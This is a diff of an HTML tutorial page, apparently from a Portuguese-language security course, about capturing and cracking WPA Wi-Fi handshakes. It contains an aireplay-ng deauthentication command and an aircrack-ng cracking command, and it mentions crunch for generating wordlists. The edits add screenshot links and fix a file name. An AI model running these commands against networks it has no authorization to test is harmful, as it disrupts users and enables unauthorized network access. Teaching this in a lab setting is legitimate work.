@@ -84,14 +84,16 @@ Hora de capturar o tão esperado WPA HANDSHAKE. Para que seja capturado, é prec
 <pre><code>sudo aireplay-ng -0 10 -a [bssid_da_rede_alvo] [nome_da_sua_interface_wireless]
 </code></pre>
 </p>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/ubuntu/imagens/aireplay-ng.png"/>
 
 <p>
 Verificar o <strong>WPA HANDSHAKE</strong> capturado no arquivo criado anteriormente na execução do comando de captura. No caso deste tutorial, o arquivo criado recebeu o nome “dados”. Dê o seguinte comando no seu diretório atual:
 </p>
 <pre><code>ls
-sudo aircrack-ng net-01.cap
+sudo aircrack-ng dados-01.cap
 </code></pre>
 </p>
+<img src="https://github.com/cavalcantteme/Seguranca20181/blob/master/Pratica_Invasao_WiFi/ubuntu/imagens/ls.png"/>
 
 <p>
 Caso não já tenha instalado, será necessário a instalação do programa crunch:
